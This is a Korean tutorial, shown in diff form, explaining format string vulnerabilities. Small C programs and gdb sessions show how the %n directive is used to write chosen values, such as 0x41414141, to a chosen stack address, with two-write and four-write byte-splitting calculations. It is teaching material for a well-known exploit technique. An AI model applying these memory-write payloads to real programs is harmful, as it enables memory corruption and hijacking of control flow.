@@ -1,0 +1,303 @@
+=======================================================================================
+ Title: format string 원리 이해
+ Author : 유동훈 (Xpl017Elz) in INetCop
+ E-mail : szoahc@hotmail.com
+ Home: http://x82.i21c.net
+ Date: f.2001/12/07 s.2002/03/22
+=======================================================================================
+
+
+P.S: 단순히 format string 기법을 이용한 exploit 보다는 확실한 개념을 이해하고 그 원리를
+     이해하는 것이 중요하다고 생각합니다. 기존에 작성해보았던 문서 작성과는 다른 관점에서
+     접근을 시도해보았습니다.
+     참고로, 이 문서의 내용은 정식으로 다듬어진 적이 없기 때문에 지저분하고, 읽기에
+     상당한 불편이 따를 수 있습니다. --;
+
+
+원하는 주소에 임의의 값을 덮어쓰기 위해 다음과 같이 test 해보았습니다.
+"%n" 디렉티브의 특성상, 주어진 주소에 값을 덮어쓰기 합니다.
+
+src: --
+
+main()
+{
+    char x0x[0x82]="\x30\xfc\xff\xbf%00100n";
+    printf(x0x);
+}
+
+--
+
+주소인 0xbffffc30을 먼저 제시해주었고요. (주소는 참고로, 리틀엔디안 포맷 방식입니다.)
+그것에 맞추어 format string("%00100n")을 넣어보았습니다.
+
+bash$ gcc -otest test.c && gdb -q test
+(gdb) br *main+66
+Breakpoint 1 at 0x804843a
+(gdb) r
+Starting program: /tmp/test
+
+Breakpoint 1, 0x804843a in main ()
+(gdb) x 0xbffffc30
+0xbffffc30:     0x00000004
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+bash$
+
+덮어쓰려고 했던 0xbffffc30의 주소값을 관찰해본 결과, 값 4byte가 쓰였죠.
+(그 이유는 format string 앞에 "\x30\xfc\xff\xbf"를 넣어주었기 때문입니다)
+"%n"이 현재까지 쓰여진 값을 주어준 주소(0xbffffc30)에 저장해주었습니다.
+
+앞에 100byte라는 크기를 주어주었는데도, 전혀 상관없이 4byte만 저장했죠. ^^ (전혀 상관없음.)
+그러면, 이번엔 앞에 값을 집어 넣어 stack에 쓴 후 "%n"으로 저장해보겠습니다.
+
+src는 다음과 같이 변경해주어야 합니다. 그 이유는 format string이 늘어났기 때문입니다.
+0xbffffc30 주소값이 "%n" 디렉티브와 상등하게 해주려면, 앞에 offset과 format string을 넣어주어야 하죠.
+저같은 경우 AAAA로 offset를 채워주었고요, "%x"를 두개 넣어서 0xbffffc30 주소에 "%n" 디렉티브가 주소에 값을
+저장할 수 있도록 하였습니다.
+
+그러나, stack에 저장된 주소값과 출력되는 주소를 맞출 경우에 (0xbffffc30<->%n) 문제가 발생할 수 있는데요.
+이 경우는 "format string("%x")으로 출력하는 stack에 있는 값이 8bit가 안될 경우에 발생합니다.
+(즉, align:4byte가 아닐 경우) 이를 위해 공격자는 format string 앞에 값을 줘서 align:4byte를 맞춥니다. ^^
+
+"%8x" <- 이렇게 써서 표현할 수 있습니다.
+(0x0을 0x00000000로 맞추어 출력함. 또한, align:4로 계산하기 좋음)
+
+만약 출력하는 stack 안의 값이 전부 4byte align으로 똑바르게 저장되어 있다면,
+이 문제는 걱정하지 않아도 됩니다. 그러나, 대부분 stack 일부분의 내용에 0x0도 포함되는
+경우가 많기 때문에 "%8x"를 넣어 값을 계산하는게 편리하죠. 
+
+자, 수정해보았습니다.
+
+src: --
+
+main() {
+    char x0x[0x82]="AAAA\x90\xfc\xff\xbf%x%x%00100x%n";
+    printf(x0x);
+}
+
+--
+
+"%x%x"가 들어갔는데요.. 제 경우에는 debugging할때 전부 4byte align을 갖춘
+16bit 값이 뚜렷하게 출력되었기 때문에 이렇게 넣어준겁니다.
+여러분의 경우는 혹시 모르니 "%8x"로 넣어 계산해주세요.
+
+debugging 결과는 다음과 같습니다.
+
+Breakpoint 1, 0x8048440 in main ()
+(gdb) x 0xbffffc90
+0xbffffc90:     0x0000007c
+(gdb)
+
+0x7c는 124byte네요. 먼저, "%00100x"을 통해 100byte를 사용했고요.
+앞부분에 "AAAA\x90\xfc\xff\xbf"가 8byte, "%x%x"는 16byte입니다. 다 더하면 ...
+
+100 + 8 + 16 = 124byte
+
+네, 전부 124byte가 맞네요. ^^
+
+그러면, 장난삼아 0xbffffc30에 0x4141 값을 집어넣어 볼까요?
+0x4141은 10진수로 16705입니다.
+"AAAA\x30\xfc\xff\xbf" :  8byte
+%x%x                   : 16byte
+총 24byte 입니다. 결국, 16681byte를 format string에 담아 stack상에 넣어주면 되겠군요.
+자 그럼, 넣어보겠습니다.
+
+src: --
+
+main() {
+    char x0x[0x82]="AAAA\x30\xfc\xff\xbf%x%x%16681x%n";
+    printf(x0x);
+}
+
+--
+
+bash$ gcc -o test test.c && gdb -q test
+(gdb) br *main+72
+Breakpoint 1 at 0x8048440
+(gdb) r
+Starting program: /tmp/test
+AAAA0??000a610bffffb04    
+
+                    ... 중 략 ...
+
+Breakpoint 1, 0x8048440 in main ()
+(gdb) x 0xbffffc30
+0xbffffc30:     0x00004141
+(gdb)
+
+좋습니다. ^^
+공격자가 원하는 주소에 어떻게 값을 덮어 쓰는지 공부해 보았습니다.
+그러나, 실제 exploit까지는 다소 응용이 필요합니다.
+
+위에서 처럼 return address에 사용자가 입력한 만큼을 저장한다고 해도..
+shellcode가 있는 즉, 공격자가 원하는 주소로 변경하려면, 한번에는 다 덮어쓰지 못합니다. 그 이유는
+format string의 값이 너무 커서 그렇습니다.. (0xbffffc30을 10진수로 변환해보면, 3221334496이 나오네요.)
+음... 안좋군요. :-(
+
+그러나, 다른 좋은 방법이 있습니다. ^^ 바로, format string을 여러개 사용하여 주소를 쪼개 넣는거죠.
+넣고자 하는 주소.. (위에서는 0x7c랑, 0x4141을 테스트 해보았습니다만)를 나누어 계산하는 겁니다.
+
+만약 0x4141을 16705로 계산해서 한번에 값을 넣어주었다면..
+0x41414141은 2byte씩 쪼개서 2번에 걸쳐 집어넣을 수 있습니다.
+
+그 방식은 간단한데요. 먼저, 아까와 같이 format string이 출력할 인자를 앞에 적어주어서 그 주소를
+참조하게 만들고요. ("AAAA\x30\xfc\xff\xbf")
+그 다음 이어서 덮어쓸 주소를 넣어줍니다. ("ZZZZ\x32\xfc\xff\xbf")
+0xbffffc30 주소에 2byte를 덮어쓴 후, 0xbffffc32 주소에 남은 2byte를 마져 덮어쓰면 되겠죠.
+다시, 단순한 test를 해보겠습니다.
+
+src: --
+
+main() {
+    char x0x[0x82]="AAAA\x30\xfc\xff\xbfZZZZ\x32\xfc\xff\xbf%x%x%00010x%n%00010x%n";
+    printf(x0x);
+}
+
+--
+
+마찬가지로, "%x%x"는 주소값과 "%n" 디렉티브가 상등하도록 맞춘 offset 16byte고요.
+참조를 위한 주소값, "AAAA\x30\xfc\xff\xbfZZZZ\x32\xfc\xff\xbf" 역시 16byte입니다.
+벌써 쓰여진 값이 32byte군요.. 여기서 첫번째 format string "%00010x"까지 합하면,
+총 42byte가 됩니다. 그리고, "%n" 디렉티브로 덮어씁니다. 다음, 두번째 format string으로
+"%00010x"를 합산하면, 52byte가 됩니다. 그리고 이 값 또한, "%n" 디렉티브로 덮어씁니다.
+
+결국, 0xbffffc30에 값 42를 저장해야하고, 0xbffffc32에 값 52가 저장되야 합니다.
+한번 확인해볼까요?
+
+(gdb) br *main+73
+Breakpoint 1 at 0x8048441
+(gdb) r
+Starting program: /tmp/test
+
+Breakpoint 1, 0x8048441 in main ()
+(gdb) x 0xbffffc30
+0xbffffc30:     0x0034002a
+(gdb)
+
+0xbffffc30에는 0x2a가 저장되어 있고요, 0xbffffc32에는 0x34가 저장되어 있는 것을 볼 수 있습니다.
+10진수로 변경하면, 0x2a는 42고, 0x34는 52가 맞는 것을 확인할 수 있습니다. :-)
+
+자, 이제 원리는 다 공부했습니다.
+실제 0xbffffc30에 공격자가 주어주는 임의의 값 0x41414141을 덮어써보도록 하겠습니다.
+
+src: --
+
+main() {
+    char x0x[0x82]=
+        "\x41\x41\x41\x41\x30\xfc\xff\xbf"
+        "\x41\x41\x41\x41\x32\xfc\xff\xbf"
+        "%x%x%16673x%n%65536x%n";
+    printf(x0x);
+}
+
+--
+
+16673은 0x4141에서 32 값을 제외한 주소입니다.
+다음, 뒤에 덮어쓸 값은 이미 쓰여진 값들을 뺀, 순수 나머지 주소가 되겠죠?
+결국, 공식은 다음과 같습니다.
+
+(0x4141 - 0x4141) - 32
+
+그런데 문제가 발생하는 군요. 0x4141을 빼버리면, 남는 값은 0이네요.
+이것은 다음과 같이 해결할 수 있습니다.
+
+우선, 0x41414141을 0xbffffc30 주소에만 넣으면 되기 때문에 0xbffffc34에 다른 값이 쓰여도 상관없을 것입니다.
+자 그러면, 0x41414141이 아닌, 0x0141414141을 덮어씌워 봅시다. 이것은
+0xbffffc34에 0x01 1byte를 더 덮어씌웁니다. 결과적으로 0xbffffc30 ~ 0xbffffc33 까지는 0x41414141를 완벽하게
+덮어씌울 수 있는 것입니다. :-)
+
+그래서, 0x014141에서 0x4141를 뺄셈하였습니다.
+
+0x010000이 남죠? 10진수로 65536이 되는군요.
+이제 계산한 값들을 덮어써보겠습니다.
+
+(gdb) x/2 0xbffffc30
+0xbffffc30:     0x41414141      0x69640001
+(gdb)
+
+w0w~! 공격 후, 이쁘게 덮어쓰인 것을 볼 수 있습니다. 물론, 0xbffffc34도 0x01값 1byte가 저장되었죠.
+실제 주소값도 이런식으로 계산하여 exploit 합니다.
+
+그렇다면, 이번엔 두번 overwrite 방식이 아닌, 네번 overwrite 방식으로 덮어써보도록 하겠습니다.
+
+src: --
+
+main() { // 0xbffffc30 주소에 0xbffffc30 값 덮어쓰기
+    char x0x[100]=
+        "\x41\x41\x41\x41\x30\xfc\xff\xbf"
+        "\x41\x41\x41\x41\x31\xfc\xff\xbf"
+        "\x41\x41\x41\x41\x32\xfc\xff\xbf"
+        "\x41\x41\x41\x41\x33\xfc\xff\xbf"
+        "%x%x%256x%n%204x%n%259x%n%192x%n";
+    printf(x0x);
+}
+
+좀 복잡해보이는 것 같지만.. 전혀 그렇지 않습니다. ^^
+우선, 4번에 덮어쓰기 때문에 1byte씩 쓴다고 보시면 됩니다.
+
+앞에 주소값과 offset을 빼고요 (32byte 쓰임), 다음 "%x%x" format string을 뺍니다. (48byte 쓰임)
+지금까지 쓰인 48byte를 빼야하는데요. 마지막 자리가 0x30이기 때문에 빼면, 0이 남겠군요. :-(
+이때는, 0x130에서 48byte를 빼줍니다. 그렇게 되면, 0xbffffc30에 0x30을 덮어씌운 후, 0xbffffc31에 0x01이
+덮어씌워집니다. (304byte 쓰임)
+
+다음, 0xfc에서 0x130을 빼려면, 0x1fc로 만들어 계산해야 합니다. 그 결과값은 10진수로 204입니다. (508byte 쓰임)
+다음, 0xff에서 0x1fc를 빼야합니다. 이것도 0x1ff로 만들어 계산합니다. 
+그러나, 이렇게 계산하면 결과값이 3이 남는데요. 남는 수가 적은 관계로 0x0100을 더 더하여 계산해주어야 합니다.
+그러므로, 0x2ff에서 0x1fc를 빼면, 259이 남습니다. (767byte 쓰임) 마지막, 0x3bf에서 0x2ff를 빼면, 192가 나옵니다.
+
+전부 정리해서 계산해보면, 총 959byte의 data를 사용하는 것을 알 수 있습니다.
+
+"\x41\x41\x41\x41\x30\xfc\xff\xbf" = 8
+"\x41\x41\x41\x41\x31\xfc\xff\xbf" = 8
+"\x41\x41\x41\x41\x32\xfc\xff\xbf" = 8
+"\x41\x41\x41\x41\x33\xfc\xff\xbf" = 8
+"%x%x"                             = 16
+0xbffffc30: 0x0130 - 0x0030        = 256
+0xbffffc31: 0x01fc - 0x0130        = 204
+0xbffffc32: 0x02ff - 0x01fc        = 259
+0xbffffc33: 0x03bf - 0x02ff        = 192
+--------------------------------------------
+합계:                              = 959byte
+
+다음은 실행 후 debugging 한 결과입니다.
+
+(gdb) x/2 0xbffffc30
+0xbffffc30:     0xbffffc30      0x6b000003
+(gdb)
+
+bingo!! :-D 최종적으로 0x03bffffc30 값을 덮어 썼습니다.
+다음 sample은 0xbffffc30 주소에 0x41414141을 덮어쓰고, 0xbffffc34 주소에 0xbffffc30을 덮어쓰는
+concept code 입니다.
+
+main() {
+    char x0x[0x82]=
+        "\x41\x41\x41\x41\x30\xfc\xff\xbf"
+        "\x41\x41\x41\x41\x32\xfc\xff\xbf"
+        "\x41\x41\x41\x41\x34\xfc\xff\xbf"
+        "\x41\x41\x41\x41\x36\xfc\xff\xbf"
+        "%x%x%16657x%n%65536x%n%47855x%n%50127x%n";
+    printf(x0x);
+}
+
+/*
+
+"\x41\x41\x41\x41\x30\xfc\xff\xbf" = 8
+"\x41\x41\x41\x41\x32\xfc\xff\xbf" = 8
+"\x41\x41\x41\x41\x34\xfc\xff\xbf" = 8
+"\x41\x41\x41\x41\x36\xfc\xff\xbf" = 8
+"%x%x"                             = 16
+0xbffffc30: 0x004141 - 0x000030    = 16657
+0xbffffc32: 0x014141 - 0x004141    = 65536
+0xbffffc34: 0x01fc30 - 0x014141    = 47855
+0xbffffc36: 0x02bfff - 0x01fc30    = 50127
+------------------------------------------------
+total:                              = 180223byte
+
+(gdb) x/3 0xbffffc30
+0xbffffc30:     0x41414141      0xbffffc30      0x67690002
+(gdb)
+
+overwrite: 0x0002bffffc3041414141
+
+*/
+
